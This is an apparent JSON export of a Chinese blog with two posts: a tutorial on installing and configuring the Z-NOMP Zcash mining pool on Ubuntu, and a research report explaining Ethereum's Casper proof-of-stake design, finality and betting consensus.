这里为支付节点</span><br><span class=\"line\">\t\t\"host\": \"127.0.0.1\",       </span><br><span class=\"line\">\t\t\"port\": 19332,</span><br><span class=\"line\">\t\t\"user\": \"testuser\",</span><br><span class=\"line\">\t\t\"password\": \"testpass\"</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">\"ports\": &#123;                 #支付端口和难度\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t         </span><br><span class=\"line\">\t\"3032\": &#123;</span><br><span class=\"line\">\t\"diff\": 0.05,</span><br><span class=\"line\">\t\"tls\": false,</span><br><span class=\"line\">\t\"varDiff\": &#123;</span><br><span class=\"line\">\t\t\"minDiff\": 0.04,</span><br><span class=\"line\">\t\t\"maxDiff\": 16,</span><br><span class=\"line\">\t\t\"targetTime\": 15,</span><br><span class=\"line\">\t\t\"retargetTime\": 60,</span><br><span class=\"line\">\t\t\"variancePercent\": 30</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">\"daemons\": [                #节点  这里为挖矿节点 可与支付节点一致</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"attr\">\"host\"</span>: <span class=\"string\">\"127.0.0.1\"</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">\"port\"</span>: <span class=\"number\">18232</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">\"user\"</span>: <span class=\"string\">\"rpcuser\"</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">\"password\"</span>: <span class=\"string\">\"rpcpassword\"</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">   ],</span><br></pre></td></tr></table></figure>\n<p>5.coin配置：</p>\n<p>进入coins目录可以看到开发者提供了zclassic和zcash等coin的配置文件，同时zcash_testnet.json为zcash的testnet方便测试，使用testnet进行测试时请保证节点一定在testnet模式。如果需要加增加coin请参考开发者提供的其他coin信息进行修改，同时在pool_config里增加池信息，以后我们在进行陆续说明。</p>\n<p>ok，现在已经配置完成，我们返回/pool目录 ，使用npm start 来启动z-nomp 矿池，就可以把矿机接入来进行挖矿了。</p>\n","site":{"data":{}},"excerpt":"","more":"<p><strong>Zcash作为采用零知识证明（zk-SNARKS）实现完全隐私保护的加密货币,在技术地位上成为竞争币一哥指日可待.</strong></p>\n<p>z-classic在github发布的矿池Z-NOMP，是基于Node Open Mining Portal的Equihash矿池，可以部署的币种有zen，zcl和zec等使用Equihash算法的矿池。</p>\n<p><strong>警告:请勿直接用于生产环境使用该软件,任何内容的修改都会对矿池造成损失.</strong></p>\n<p>首先，部署环境，我们使用的是ubuntu server 16.04 x64的系统。</p>\n<p>1.安装z-nomp依赖：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install update</span><br><span class=\"line\">sudo apt-get install build-essential libsodium-dev npm git</span><br><span class=\"line\">sudo npm install n -g</span><br><span class=\"line\">sudo n 8.9.4</span><br></pre></td></tr></table></figure>\n<p>2.下载和安装z-nomp：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/joshuayabut/node-open-mining-portal.git /pool</span><br><span class=\"line\">cd /pool</span><br><span class=\"line\">npm config set registry https://registry.npm.taobao.org  #使用淘宝npm镜像</span><br><span class=\"line\">npm update</span><br><span class=\"line\">sudo npm install   #就算root账户也一定要加sudo</span><br></pre></td></tr></table></figure>\n<p>3.矿池配置文件：<br>修改示例文件config_example.json。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mv config_example.json config.json</span><br><span class=\"line\">vim config.json</span><br></pre></td></tr></table></figure>\n<p>下面提供一些主要配置说明：<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\"redis\": &#123;</span><br><span class=\"line\">\t\"host\": \"127.0.0.1\",   #redis地址</span><br><span class=\"line\">\t\"port\": 6379,          #redis端口</span><br><span class=\"line\">\t\"password\": \"\"      #redis密码</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">   &#125;,</span><br><span class=\"line\">    </span><br><span class=\"line\">\"website\": &#123;</span><br><span class=\"line\">\t\"enabled\": true,</span><br><span class=\"line\">\t\"host\": \"0.0.0.0\",                 #website地址</span><br><span class=\"line\">\t\"port\": 8080,                      #website端口</span><br><span class=\"line\">\t\"stratumHost\": \"cryppit.com\",      #挖矿域名    </span><br><span class=\"line\">\t\"stats\": &#123;</span><br><span class=\"line\">\t\t\"updateInterval\": 30,</span><br><span class=\"line\">\t\t\"historicalRetention\": 14400,</span><br><span class=\"line\">\t\t\"hashrateWindow\": 300</span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">\t\t\t\t\t\t           </span><br><span class=\"line\">\t\"tlsOptions\" : &#123;</span><br><span class=\"line\">\t\t\"enabled\": false,          #ssl挖矿</span><br><span class=\"line\">\t\t\"cert\": \"\",                #ssl公钥地址</span><br><span class=\"line\">\t\t\"key\": \"\"                  #ssl私钥地址</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;,</span><br></pre></td></tr></table></figure></p>\n<p>4.数字货币配置：</p>\n<p>进入pool_config，重新命名zcash_example.json为zcash.json并修改示例内容.</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd pool_config</span><br><span class=\"line\">mv zcash_example.json zcash.json</span><br><span class=\"line\">vim zcash.json</span><br></pre></td></tr></table></figure>\n<p>主要配置文件说明：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\"enabled\": true,         #设置打开coin</span><br><span class=\"line\">\"coin\": \"zcash.json\",    #coin配置文件</span><br><span class=\"line\">\"address\": \"\",           #coinbase地址，即挖到块后保存的地址，且该地址一定要在节点中 </span><br><span class=\"line\">\"zAddress\": \"\",          #Z地址</span><br><span class=\"line\">\"tAddress\": \"\",          #T地址</span><br><span class=\"line\"></span><br><span class=\"line\">\"rewardRecipients\": &#123;</span><br><span class=\"line\">\t\"\": 0.2,             #手续费和接收手续费地址</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">\"paymentProcessing\": &#123;</span><br><span class=\"line\">\t\"minConf\": 10,</span><br><span class=\"line\">\t\"enabled\": false,             #支付进程</span><br><span class=\"line\">\t\"paymentMode\": \"prop\",        #挖矿模式</span><br><span class=\"line\">\t\"_comment_paymentMode\":\"prop, pplnt\",</span><br><span class=\"line\">\t\"paymentInterval\": 20, </span><br><span class=\"line\">\t\"minimumPayment\": 0.1,         #最低支付额</span><br><span class=\"line\">\t\"maxBlocksPerPayment\": 1,     </span><br><span class=\"line\">\t\"daemon\": &#123;                    #节点信息 这里为支付节点</span><br><span class=\"line\">\t\t\"host\": \"127.0.0.1\",       </span><br><span class=\"line\">\t\t\"port\": 19332,</span><br><span class=\"line\">\t\t\"user\": \"testuser\",</span><br><span class=\"line\">\t\t\"password\": \"testpass\"</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">\"ports\": &#123;                 #支付端口和难度\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t         </span><br><span class=\"line\">\t\"3032\": &#123;</span><br><span class=\"line\">\t\"diff\": 0.05,</span><br><span class=\"line\">\t\"tls\": false,</span><br><span class=\"line\">\t\"varDiff\": &#123;</span><br><span class=\"line\">\t\t\"minDiff\": 0.04,</span><br><span class=\"line\">\t\t\"maxDiff\": 16,</span><br><span class=\"line\">\t\t\"targetTime\": 15,</span><br><span class=\"line\">\t\t\"retargetTime\": 60,</span><br><span class=\"line\">\t\t\"variancePercent\": 30</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">\"daemons\": [                #节点  这里为挖矿节点 可与支付节点一致</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"attr\">\"host\"</span>: <span class=\"string\">\"127.0.0.1\"</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">\"port\"</span>: <span class=\"number\">18232</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">\"user\"</span>: <span class=\"string\">\"rpcuser\"</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">\"password\"</span>: <span class=\"string\">\"rpcpassword\"</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">   ],</span><br></pre></td></tr></table></figure>\n<p>5.coin配置：</p>\n<p>进入coins目录可以看到开发者提供了zclassic和zcash等coin的配置文件，同时zcash_testnet.json为zcash的testnet方便测试，使用testnet进行测试时请保证节点一定在testnet模式。如果需要加增加coin请参考开发者提供的其他coin信息进行修改，同时在pool_config里增加池信息，以后我们在进行陆续说明。</p>\n<p>ok，现在已经配置完成，我们返回/pool目录 ，使用npm start 来启动z-nomp 矿池，就可以把矿机接入来进行挖矿了。</p>\n"},{"title":"以太坊POS-Casper技术研究报告","comments":0,"date":"2018-03-21T02:20:37.000Z","img":null,"_content":"## 定义\n### PoW：Proof of Work，工作量证明\n依赖机器进行数学运算来获取记账权,资源消耗相比其他共识机制高、可监管性弱,同时每次达成共识需要全网共同参与运算,性能效率比较低,容错性方面允许全网50%节点出错。\n\n### PoS：Proof of Stake，权益(股权)证明\n主要思想是节点记账权的获得难度与节点持有的权益成反比,相对于PoW,一定程度减少了数学运算带来的资源消耗,性能也得到了相应的提升,但依然是基于哈希运算竞争获取记账权的方式,可监管性弱.该共识机制容错性和PoW相同.它是Pow的一种升级共识机制,根据每个节点所占代币的比例和时间,等比例的降低挖矿难度,从而加快找随机数的速度。\n\n## 以太坊Casper\n### 优势\n- 不需要消耗大量的资源就可以保证区块链的安全性.参与 PoS 的代币数量相当于 PoW\n算力，达到了同样的出块效果却不用消耗真实的电力,根据比特币能源消耗指数,当前全球用于比特币挖矿所产生的年用电量预计为30.14太瓦时(TWh),比159个国家年均用电量还高。\n- 因为不再需要大量资源，就不需要最大化的发行新币来激励参与者,从而降低网络的压力.理论上甚至有可能出现负净发行,其中一部分交易费用被消耗掉，因此供应随着时间的推移而下降。\n- 权益证明为更广泛的使用博弈论机制设计的技术敞开了大门,以便更好地阻止中心化垄断的形成,以及(如果确实形成了中心化垄断)伤害网络的行为。\n- 降低中心化风险之后，经济规模的扩大便不是问题.在工作量证明机制中，当资本多到一定程度，便可以投入更大规模的生产设备，拉大和其他人的差距（投入一千万的成本所获得的收益不只是投入一百万的十倍）.而在权益证明机制中，一千万的投资只能保证获取一百万投资的十倍的收益。\n- 相对于工作量证明，能够使用经济处罚来大大提高各种形式的 51％ 攻击的成本.正如 Vlad Zamfir 所说的，“只要参与了 51％ 攻击，ASIC 矿场就会被烧毁”。\n\n### Casper与Pos的区别\nCasper实施了一个进程，使得它可以惩罚所有的恶意因素.这就是权益证明在Casper下是如何工作的：\n- 验证者押下一定比例的他们拥有的以太币作为保证金\n- 验证者开始验证区块.也就是说，当验证者发现一个区块并认为这个区块可以被加到链上的时候，验证者将以通过押下赌注来验证它\n- 如果该区块被加到链上，然后验证者们将得到一个跟他们的赌注成比例的奖励\n- 但是，如果一个验证者采用一种恶意的方式行动、试图做“无利害关系”的事，他们将立即遭到惩罚，他们所有的权益都会被砍掉\n\n正如以上，Casper被设计成可以在一个无需信任的系统上工作，并且是更加拜占庭容错的。\n任何人，如果以一种恶意的，或者说有拜占庭叛徒式的方式行动，就会立即受到惩罚、失去他们的保证金.这就是Casper不同于其他权益证明协议的地方.恶意元素会失去一些东西，所以，“无利害关系”是不可能的。\n这不是唯一一个Casper可以惩罚验证者的地方，正如Hudson James以及Joris Bontje在“StackExchange”的回答中标注的那样，Casper设计了苛刻的激励来保证网络的安全，包括惩罚离线的矿工，不管它是有意还是无意的。这意味着验证者将不得不变得对他们的节点正常运行时间小心翼翼.粗心或者懒惰都将导致他们失去自己保证金.这一属性减少了对交易和整体利用率的审查.围绕着所有这些，这种“惩罚”属性同样给予了Casper相对标准工作量证明协议的明显优势。\n![](/images/pos_createblock.png)\n如上图所示,在一个工作量证明协议中，一个矿工会在蓝色链上还是红色链上挖矿并不重要.因为诚实的和恶意的矿工都将花费同等数量的资源。然而，在Casper中，如果一个诚实的验证者在蓝色链上挖矿，他们将得到与他们的赌注成比例的奖励，但一个恶意的矿工将因为下注在红色链条上而失去他们的保证金。\n\n### Casper版本\nCasper不是一个具体的项目.它是两个研究项目的融合，这两个在最近一直由以太坊开发者团队承担：\n- Casper the Friendly Finality Gadget（FFG）\n- Casper the Friendly GHOST: Correct-by-Construction（CBC）\n\n### Casper FFG\nCasper FFG也就是Vitalik版Casper，是一个混合PoW/PoS共识机制,它是正准备进行初步应用的版本，也是被精心设计好来缓冲权益证明的转变过程的.设计的方式是，一个权益证明协议被叠加在正常的以太坊版工作量证明协议上.虽然区块仍将通过工作量证明来挖出，每50个区块就将有一个权益证明检查点，也就是网络中验证者评估确定性（Finality）的地方。\n\n### 确定性（Finality）\n确定性（Finality），从一个非常宽松的意义上来说，意味着一旦一个特定的操作完成，它将永远被蚀刻在历史上，没有任何东西可以逆转这个操作.在处理金融事务的领域，这是非常重要的.例如,A在一个公司里拥有特定数目的一种资产.就算公司的某些进程中出了一点小故障，A也不应该需要恢复对该资产的所有权.\n有人说，工作量证明是唯一一种在区块链上实现确定性的方式.但是，这并不是必然正确的.真相远比这个要复杂很多。\n正如Vitalic Buterin提出的:世界上没有一个系统可以提供100%的确定性.黑进一个系统，或者物理上破解一份注册表并篡改数字以改变一个人的资产负债表，都是有可能的.这也是中心化机构的一个大问题.但是，分布式的系统也会面临同样的问题。\n实际上，比特币是工作量证明机制的典范，至少三次曾经面临确定性问题.在一个例子中，链必须分叉，因为一个Bug存在于软件的一个版本中但在其它版本中并不存在.这在社区中导致了分裂，一部分人拒接接受被另一部分人所接受的链.这次分裂在6个小时中被解决。\n所以，问题在于，Casper FFG如何能够提供确定性？根据Vitalik的说法 ，因为下面三个理由，Casper保证可以提供比工作量证明更强的确定性:\n- 完全经济确定性.三分之二的验证者会下最大几率的赌注使区块达到最终一致.因此，对他们来说，串谋以及攻击网络的激励是非常小的，因为，如果他们这样做的话，他们将危及自己的保证金.Vlad Zamfir更好地解释了这一点，他说：“设想一种版本的工作量证明，如果你参与一场51%供给的话，你的矿机会烧毁.”\n- 假设整个网络由三个人组成：Alice，Bob，和Charlie.假设Alice和Bob将他们的保证金放在一种结论上，同时，Bob和Charlie把他们的保证金放在一个与之对立的结论上。不管发生什么事，Alice或者Charlie其中一人肯定会损失一大笔钱.所以，正如你可以看到的，验证者没有动机去串谋或用恶意的方式行动，因为他们总会失去一大笔钱\n- 然而，如果双重确定性（Double Finality）发生的话，还有一种意外事故处理方案.如果双重确定性发生的话，用户可以选择他们想到哪条链上去。不管哪条链，得到多数票的就成为主链.基本上，在Casper上，双重确认会导致硬分叉而不是回滚。\n\n### Casper CBC\nCasper CBC也就是Vlad版Casper使用建构修正（correct-by-construction，CBC）协议。\n下面是一个普通的协议设计：\n- 正式指定协议\n- 定义该协议必须满足的属性\n- 证明该协议可以满足给定的属性\n\n而CBC协议的设计是：\n- 正式地但只是部分地指定协议\n- 定义该协议必须指定的属性\n- 从满足所有它被规定去指明的属性中推导出该协议\n- 提出一个合理估计的错误的例外情况\n- 列出所有在未来可能发生的错误\n\n所以，Casper CBC要做的事情，就是不断进行微调、让这个只是部分建构好的协议更加完美，直到它变成完全版。目前来说，以太坊开发者团队一直在努力地开发这两个Casper项目.很明显，这不会是最终版本，但不管这最终版本是什么，它肯定会受到Vlad的和Vitalik的Casper的深刻影响.正如刚刚提到过的，Vitalik的Casper将被初步运行以缓冲从PoW到PoS的转变.而Vlad的Casper，通过使用一个“理想对手”推导出一个安全性论证\n\n## Casper知识\n### Casper:去中心化\n![](/images/pos_decentralization.png)\n正如在上图看到的，工作量证明协议不再是真正对去中心化友好的了。\n大部分哈希算力集中在几个特定的矿池，而这意味着无论发生什么事，他们总会比其他人有更大的机会挖到区块、获得奖励。\n因为他们可以获得更多钱，他们可以买得起更好更快的ASIC设备.这基本上意味着，无论发生什么，大矿池将总是比个人和小矿池拥有优势.换句话来说，富有的将变得更富有。\n权益证明通过让挖矿完全虚拟化使得这一切都无关紧要.然而，这不是权益证明减缓中心化效果的唯一途径.为了理解这个，首先需要弄懂“经济规模”意味着什么。\n跟大企业很像，大矿池可以通过下列途径减少他们投入资源的成本：\n- 在大规模运营中分摊固定成本\n- 作为一个更大的经营主体，拥有议价能力\n\n这意味着，一个大而有影响力的矿池可以一美元又一美元地比其他矿池生产更多哈希算力，即便他们投入了等量的资金。\n这一问题在权益证明中完全被消解了，因为一个简单的原因.在权益证明中你投资一份保证金.你不能轻易地结成矿池然后让你的保证金一美元又一美元地升值.在一天结束的时候，一美元还是一美元.规模经济在这里不起作用。\n\n### Casper:能源效率\n上面讲过,当前全球用于比特币挖矿所产生的年用电量预计为30.14太瓦时(TWh),比159个国家年均用电量还高.最糟糕的部分是，能源浪费是为了能源浪费.尤其是比特币，其对能源的欲望是非常贪婪的。\n\n所以，很明显，比特币使用太多电力了，太多钱被花在资源上了.但是，外部成本是大量的电力消耗对环境产生的影响必定是巨大的。\n\n虽然毫无疑问地比特币和工作量证明已经造成了大量积极的社会影响，我们至少应该看看权益证明系统可以做到怎样的规模，以及，它是否可以在不消耗那么多电力的情况下工作。\n\n### Casper:经济安全\nCasper的最大优势是它的经济安全性.假设你是一个验证者，并且你将你自己的钱作为保证金存入网络.以最大化网络利益的方式行事也是你自己的利益.知道了如果有恶意的行为你的保证金中的一大部分将被罚没，你为什么还会那样做呢？\n\n当你有很多钱锁定在里面的时候，你为什么还要攻击网络、损害币值呢？同样地，“惩罚效应”消除了Vitalik定义的“驻守重生点攻击（spawn camping attack）”的可能性。\n\n在权益证明中，重生点攻击可以被防止，因为一个简单的事实：一次攻击将导致惩罚，没收已投入的保证金.如果你没有投入任何保证金，就不能成为Casper验证人。\n\n### 以太坊Casper的未来\nVitalik\nButerin说不仅Casper准备好接受测试了，它还可以在客户端更新代码时提供一个安全提升.虽然看起来并不像它已经准备好用来广泛普及了，但第一个Casper测试网发布的日子看起来是越来越近了。\n\n权益证明是否将要实施并不是一个问题，问题是什么时候能够实施.以太坊“宁静”（Serenity）应该是一个权益证明网络.此前我们并不是从未见过PoS的实行，Peercoin非常成功地运用了它.但是，我们从还从来没有看过在这个层面采用该协议。也许，如果Casper被成功运行的话，另一个加密货币会跟风并且做出转换.不管事情会变成什么样，Casper带来了非常多迷人的可能性。\n\n## Casper技术\n### 投注共识\nCasper是一种以太坊下一代的共识机制,属于PoS Casper的共识是按块达成的而不是像PoS那样按链达成的。\n\nCasper向公开经济学共识这个领域引入了一个根本上全新的理念作为自己的基础：投注共识.投注共识的核心思想很简单：为验证人(validator)提供与协议对赌哪个块会被最终确定的机会.在这里对某个区块X的投注就是一笔交易，在所有区块X被处理了的世界中都会带给验证人Y个币的奖励（奖励是凭空“印”出来的，因而是“与协议”对赌），而在所有区块X没有被处理的世界中会对验证人收取Z个币的罚款（罚金被销毁）。\n\n为了防止验证人在不同的世界中提供不同的投注,还有一个简单严格的条款:如果有两次投注序号一样,或者说提交了一个无法让Casper合约处理的投注,会失去所有保证金..从这一点可以看出,Casper与传统的PoS不同的是Casper有惩罚机制,这样非法节点通过恶意攻击网络不仅得不到交易费,而且还面临着保证金被没收的风险。\n\n只有在相信区块X在人们关心的那个世界中被处理的可能性足够大时，这才是值得去做的交易，验证人才会愿意投注.然而，接下来就是经济上递归的有趣部分：人们关心的那个世界，也就是用户的客户端在用户想要知道他们的账户余额或是合约的状态时所展现的那个状态，本身就是根据人们对哪个区块投注最多推导出来的.因此,每一个验证人都具有根据他们所预期的其他人的投注情况进行投注的动机，驱使这个过程走向收敛。\n\n一个有帮助的类比是工作量证明共识 - 它本身看起来非常独特，实际上可以成为投注共识的一个特别子模型.理由如下：当你基于一个块挖矿时，你是在花费每秒E的电力成本换取每秒p的出块概率，并且在所有包含你的出块的分叉中获得R个币，在其它分叉中分文不得。\n![](/images/pos_createblock2.png)\n因此，每一秒钟，在你挖矿的链上你可以获得p * (R-E) 的期望收益，在其它链上遭受E的损失；因此你的挖矿选择可以理解为下注赌你所在的链有 E:p * (R-E) 的相对概率(odds)胜出。\n比如，假设p等于百万分之一，R是25个币约等于10000美元，而E是0.007美元，则在胜出链上每秒钟的期望收益是0.000001 * 10000 - 0.007 = 0.003，在失败链上的损失是0.007的电力成本，因此这是在赌自己挖矿的链有7:3的相对概率胜出.注意工作量证明满足上面所说的经济上递归的要求：用户的客户端通过处理拥有最大工作量的那条链来计算其账户余额。\n\n投注共识可以看作是包含了以特定方式看待的工作量证明的一个框架，也适合为其他多种类型的共识协议提供能促进收敛的经济博弈.例如传统的拜占庭容错共识协议中，通常在对某个结果进行最后\"commit\"之前还有\"pre-votes\"和\"pre-commits\"的概念；在投注共识的模型下，我们可以把每一阶段都变成投注，这样后面阶段的参与者就有更大把握相信前面阶段的参与者“真的是这个意思”。\n\n投注共识还可以用于激励链外人类共识(out-of-band human consensus)的正确行为，为了克服类似51%攻击的极端情况有需要的话.假设有人购买了一条PoS链上超过一半的币，并进行攻击，那么社区只需要协商出一个让客户端忽略攻击者分叉的补丁，就能自动让攻击者失去所有的币.一个极有野心的目标是让在线节点可以自动的产生这种分叉决定,如果能成功实现，传统容错研究中的一个被低估但却重要的结论,在强同步假设下，即使几乎所有节点都在尝试攻击系统，剩下的节点依然可以达成共识,也可以被纳入投注共识的框架中。\n\n在投注共识的情境中，不同的共识协议只在一件事情上有区别：谁，可以以什么赔率，投多少注？工作量证明只提供了一种赌局：投注胜出链有E:p * R-E的相对概率包含你自己出的块.在广义的投注共识中，依据一种被称为评分规则(scoring rule)的机制我们本质上可以提供无限多种赌局：在1:1上压极小的一注，在1.000001:1上也压极小注，在1.000002:1上也压极小注，如此继续。\n\n![](/images/pos_bet.png)\n参与者依然可以选择在每一个概率等级上的这些极小边际投注的确切大小，但大体上这个技术让我们能打探出验证人认为某个块会被确认的相当精确的概率读数.如果验证人认为一个块有90%的概率会被确认，那么他们就会接受所有相对概率低于9:1的赌局，拒绝相对概率高于9:1的赌局，而协议就能基于这一点准确得出这个块会被确认的概率是90%的“看法”.事实上，显示原理(revelationprinciple)告诉我们可以要求验证人直接给出他们对某个块被确认概率的“看法”的签名消息，让协议代表验证人计算投注。\n\n![](/pos_voting.png)\n从上面的微积分图中，可以得到在每一个概率等级上计算总奖励和总惩罚的简单函数，计算结果在数学上等价于根据验证人信心在所有概率等级上形成的投注的无限集合的总和.一个简单的例子是s(p)= p(1-p)和f(p) = (p/(1-p))^2/2，这里s计算如果你投注的事件发生能获得的奖励，f 计算如果没有发生你受到的惩罚。\n投注共识的广义形式有一个重要优点.在工作量证明中，给定区块背后的“经济权重”仅仅随着时间线性增加：如果一个块有6个确认，那么要撤销它只需要花费矿工大约6倍于出块奖励（在均衡态下）的成本，而如果一个块有600个确认，那么撤销它的成本就是出块奖励的600倍.在广义的投注共识中，验证人在一个块上投入的经济权重可以指数级增加：如果其他大多数验证人愿意以10:1下注，你可能会想冒险以20:1下注；而一旦几乎所有人都增加到20:1，你可能会跳到40:1或者更高.因此，一个块很可能在几分钟之内，取决于验证人有多少勇气（以及协议提供的激励大小），就达到一种“准最终确定”的状态，这种状态下验证人的所有保证金都成为了支持这个块的投注。\n","source":"_posts/以太坊POS-Casper技术研究报告.md","raw":"---\ntitle: 以太坊POS-Casper技术研究报告\ncomments: false\ndate: 2018-03-21 10:20:37\ncategories: 矿池\ntags:\n- lucas556\n- 以太坊\n- POS\n- Casper\nimg:\n---\n## 定义\n### PoW：Proof of Work，工作量证明\n依赖机器进行数学运算来获取记账权,资源消耗相比其他共识机制高、可监管性弱,同时每次达成共识需要全网共同参与运算,性能效率比较低,容错性方面允许全网50%节点出错。\n\n### PoS：Proof of Stake，权益(股权)证明\n主要思想是节点记账权的获得难度与节点持有的权益成反比,相对于PoW,一定程度减少了数学运算带来的资源消耗,性能也得到了相应的提升,但依然是基于哈希运算竞争获取记账权的方式,可监管性弱.该共识机制容错性和PoW相同.它是Pow的一种升级共识机制,根据每个节点所占代币的比例和时间,等比例的降低挖矿难度,从而加快找随机数的速度。\n\n## 以太坊Casper\n### 优势\n- 不需要消耗大量的资源就可以保证区块链的安全性.参与 PoS 的代币数量相当于 PoW\n算力，达到了同样的出块效果却不用消耗真实的电力,根据比特币能源消耗指数,当前全球用于比特币挖矿所产生的年用电量预计为30.14太瓦时(TWh),比159个国家年均用电量还高。\n- 因为不再需要大量资源，就不需要最大化的发行新币来激励参与者,从而降低网络的压力.理论上甚至有可能出现负净发行,其中一部分交易费用被消耗掉，因此供应随着时间的推移而下降。\n- 权益证明为更广泛的使用博弈论机制设计的技术敞开了大门,以便更好地阻止中心化垄断的形成,以及(如果确实形成了中心化垄断)伤害网络的行为。\n- 降低中心化风险之后，经济规模的扩大便不是问题.在工作量证明机制中，当资本多到一定程度，便可以投入更大规模的生产设备，拉大和其他人的差距（投入一千万的成本所获得的收益不只是投入一百万的十倍）.而在权益证明机制中，一千万的投资只能保证获取一百万投资的十倍的收益。\n- 相对于工作量证明，能够使用经济处罚来大大提高各种形式的 51％ 攻击的成本.正如 Vlad Zamfir 所说的，“只要参与了 51％ 攻击，ASIC 矿场就会被烧毁”。\n\n### Casper与Pos的区别\nCasper实施了一个进程，使得它可以惩罚所有的恶意因素.这就是权益证明在Casper下是如何工作的：\n- 验证者押下一定比例的他们拥有的以太币作为保证金\n- 验证者开始验证区块.也就是说，当验证者发现一个区块并认为这个区块可以被加到链上的时候，验证者将以通过押下赌注来验证它\n- 如果该区块被加到链上，然后验证者们将得到一个跟他们的赌注成比例的奖励\n- 但是，如果一个验证者采用一种恶意的方式行动、试图做“无利害关系”的事，他们将立即遭到惩罚，他们所有的权益都会被砍掉\n\n正如以上，Casper被设计成可以在一个无需信任的系统上工作，并且是更加拜占庭容错的。\n任何人，如果以一种恶意的，或者说有拜占庭叛徒式的方式行动，就会立即受到惩罚、失去他们的保证金.这就是Casper不同于其他权益证明协议的地方.恶意元素会失去一些东西，所以，“无利害关系”是不可能的。\n这不是唯一一个Casper可以惩罚验证者的地方，正如Hudson James以及Joris 